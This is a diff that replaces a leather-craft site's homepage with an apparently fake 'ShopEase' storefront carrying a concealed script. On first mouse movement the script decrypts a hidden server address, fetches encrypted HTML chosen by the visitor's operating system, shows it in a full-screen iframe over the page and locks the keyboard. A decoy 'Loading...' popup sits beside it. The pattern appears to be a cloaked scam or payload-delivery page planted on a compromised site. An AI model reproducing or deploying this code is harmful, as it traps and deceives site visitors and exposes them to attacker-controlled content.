@@ -1,9 +1,312 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Independent Leather Atelier | Leather Crafted Way</title><meta name="description" content="Original leather craft guidance, material notes and responsibly described atelier collections from Leather Crafted Way."><script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('consent','default',{analytics_storage:'denied',ad_storage:'denied',ad_user_data:'denied',ad_personalization:'denied'});gtag('js',new Date());gtag('config','G-0LY0HY7L01');</script><link rel="stylesheet" href="assets/style.css"></head><body class="home-page"><header class="atelier-header"><div class="edition"><i></i><span>London atelier<br>Edition 08 / 26</span></div><a class="brand" href="index.php"><b>Leather</b><span>Crafted Way</span></a><button class="menu-toggle" type="button" aria-expanded="false" aria-controls="top-drawer"><span>Atelier index</span><i></i><i></i></button></header><div class="top-drawer" id="top-drawer" aria-hidden="true"><nav aria-label="Primary navigation"><a href="index.php"><small>01</small>Workshop</a><a href="atelier-story.html"><small>02</small>Our method</a><a href="collection-index.html"><small>03</small>Collection index</a><a href="craft-journal.html"><small>04</small>Field notes</a><a href="contact.html"><small>05</small>Contact</a></nav><p>Objects shaped by material, measured construction and patient finishing.</p></div><main><section class="atelier-hero" id="home-01"><div class="hero-copy"><p class="kicker">01 / THE WORKSHOP REGISTER</p><h1>Form follows<br><em>the grain.</em></h1><p class="lead">Leather Crafted Way is an independent material journal and small-batch design studio exploring how leather is selected, cut, joined and cared for.</p><a class="cta" href="collection-index.html">Open the collection index <span>↗</span></a></div><figure><img src="assets/images/hero.png" alt="Leather artisan workbench with hides, hand tools and an unfinished satchel"><figcaption><span>OBJECT 01</span><b>FIELD SATCHEL / VEGETABLE-TANNED HIDE</b></figcaption></figure><div class="hero-stamp" aria-hidden="true">LCW<br><small>LONDON</small></div></section>
-<section class="hide-register" id="home-02"><div class="register-track"><span>FULL-GRAIN</span><i>01</i><span>VEGETABLE-TANNED</span><i>02</i><span>SUEDE</span><i>03</i><span>WAXED FINISH</span><i>04</i><span>FULL-GRAIN</span><i>01</i></div></section>
-<section class="material-specimens" id="home-03"><header><p class="kicker">03 / MATERIAL SPECIMENS</p><h2>Read the surface<br>before the pattern.</h2><p>Choose a specimen to inspect how structure, finish and likely use can differ. Natural variation is part of the material, not a promise that every hide will look identical.</p></header><div class="swatch-console"><div class="swatch-tabs" role="tablist" aria-label="Leather specimens"><button class="active" data-swatch="grain">01 Full-grain</button><button data-swatch="veg">02 Vegetable-tanned</button><button data-swatch="suede">03 Suede</button><button data-swatch="wax">04 Waxed</button></div><div class="swatch-display" data-swatch-display="grain"><div class="swatch-surface"></div><small data-swatch-code>LCW / FG-01</small><h3 data-swatch-title>Full-grain hide</h3><p data-swatch-copy>Dense surface character, visible grain variation and a finish that can record use over time.</p><dl><div><dt>Hand</dt><dd data-swatch-hand>Structured</dd></div><div><dt>Best considered for</dt><dd data-swatch-use>Bags and cases</dd></div></dl></div></div></section>
-<section class="stitch-path" id="home-04"><div class="path-visual" aria-hidden="true"><svg viewBox="0 0 900 420"><path class="seam-base" d="M18 330 C160 60 300 400 440 126 S710 80 874 292"/><path class="seam-thread" d="M18 330 C160 60 300 400 440 126 S710 80 874 292"/></svg><span class="needle">↗</span></div><div class="path-copy"><p class="kicker">04 / STITCH PATH</p><h2>A seam is a sequence of decisions.</h2><ol><li><b>01</b><span>Mark a consistent line</span></li><li><b>02</b><span>Prepare balanced holes</span></li><li><b>03</b><span>Set even thread tension</span></li><li><b>04</b><span>Finish without excess bulk</span></li></ol></div></section>
-<section class="construction-ledger" id="home-05"><header><p class="kicker">05 / CONSTRUCTION LEDGER</p><h2>Inside one useful object.</h2></header><div class="ledger-grid"><article><span>01</span><h3>Purpose</h3><p>Define what the object must carry, protect and make easy to reach.</p></article><article><span>02</span><h3>Pattern</h3><p>Resolve fold lines, seam allowance and reinforcement before cutting the hide.</p></article><article><span>03</span><h3>Assembly</h3><p>Sequence glue, stitching and hardware so each step remains accessible.</p></article><article><span>04</span><h3>Finish</h3><p>Refine edges, test moving parts and document realistic care guidance.</p></article></div></section>
-<section class="hardware-bench" id="home-06"><figure><img src="assets/images/process.png" alt="Top-down leather craft process with pattern pieces, tools and waxed thread"></figure><div><p class="kicker">06 / HARDWARE BENCH</p><h2>Strength should be placed, not merely added.</h2><p class="lead">Buckles, rivets and reinforcement are selected around load, movement and repair access. More hardware does not automatically make a better object.</p><div class="bench-meter"><span>LOAD</span><i><b></b></i><span>FLEX</span></div><a class="text-link" href="atelier-story.html">Study the atelier method ↗</a></div></section>
-<section class="care-routine" id="home-07"><div><p class="kicker">07 / CARE ROUTINE</p><h2>Small attention,<br>at the right interval.</h2><p>Remove dry surface dust, allow damp leather to dry naturally, spot-test any product and follow the original maker's care guidance. Structural damage is work for a qualified repairer.</p></div><div class="care-dial" data-care-dial><button data-care="observe" class="active">Observe</button><button data-care="clean">Clean</button><button data-care="condition">Condition</button><button data-care="store">Store</button><div><small>NEXT ACTION</small><b data-care-title>Inspect before applying anything</b><p data-care-copy>Look for dryness, transferred colour, loose stitching and hardware movement under clear light.</p></div></div></section>
-<section class="journal-folio" id="home-08"><header><p class="kicker">08 / FIELD NOTES</p><h2>Practical observations from the bench.</h2><a href="craft-journal.html">Browse all twelve notes ↗</a></header><div class="folio-cards"><a href="journal-01.html"><small>MATERIAL / 01</small><h3>How to Read Full-Grain Leather</h3><span>Open note ↗</span></a><a href="journal-05.html"><small>STITCH / 05</small><h3>Planning a Hand-Stitched Seam</h3><span>Open note ↗</span></a><a href="journal-10.html"><small>PATINA / 10</small><h3>Understanding Surface Change</h3><span>Open note ↗</span></a></div></section>
-<section class="atelier-invitation" id="home-09"><div class="invitation-mark">09</div><div><p class="kicker">THE NEXT OBJECT</p><h2>Begin with use.<br>Let material answer.</h2><p class="lead">Explore the collection register, read an original field note or write to the atelier with a considered project question.</p><a class="cta light" href="contact.html">Contact Leather Crafted Way <span>↗</span></a></div></section></main><footer><div><h3>Explore</h3><a href="atelier-story.html">Atelier Story</a><a href="collection-index.html">Collection Index</a><a href="craft-journal.html">Craft Journal</a></div><div><h3>Contact</h3><p class="one-line">3638 Westbourne Grove, London, UK, W2 5SH, GB</p><a class="one-line" href="tel:+12125559857">+1 2125559857</a><a class="one-line" href="mailto:hello@leathercraftedway.com">hello@leathercraftedway.com</a></div><div><h3>Policies</h3><a href="privacy.html">Privacy</a><a href="terms.html">Terms</a><a href="refund.html">Refund</a><a href="shipping.html">Shipping</a></div></footer><aside class="consent" aria-label="Analytics choice"><p>Optional analytics helps us understand which craft notes are useful. Advertising storage remains disabled.</p><button type="button" data-consent="accept">Allow analytics</button><button type="button" data-consent="decline">Decline</button></aside><script src="assets/app.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
+</html>
